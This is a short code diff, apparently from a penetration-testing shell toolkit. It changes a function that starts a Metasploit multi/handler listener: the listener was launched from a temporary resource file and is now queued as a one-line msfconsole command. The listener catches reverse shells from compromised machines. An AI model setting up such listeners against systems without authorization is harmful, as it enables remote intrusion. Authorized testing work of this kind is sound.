@@ -95,18 +95,9 @@ nb-shell-handlers-msf-listener() {
     esac
     
     clear
-    
-    # Generate a random number for the file name
-    rand=$(shuf -i 1000-9999 -n 1)
-    rc_file="/tmp/msf_listener_$rand.rc"
 
-    echo "use exploit/multi/handler" > "$rc_file"
-    echo "set payload ${__PAYLOAD}" >> "$rc_file"
-    echo "set LHOST ${__LHOST}" >> "$rc_file"
-    echo "set LPORT ${__LPORT}" >> "$rc_file"
-    echo "exploit" >> "$rc_file"
-
-    msfconsole -q -r "$rc_file"
+    local cmd="use exploit/multi/handler; set payload ${__PAYLOAD}; set LHOST ${__LHOST}; set LPORT ${__LPORT}; exploit"
+    print -z "msfconsole -n -q -x \" ${cmd} \""
 }
 
 nb-shell-handlers-msf-payload() {
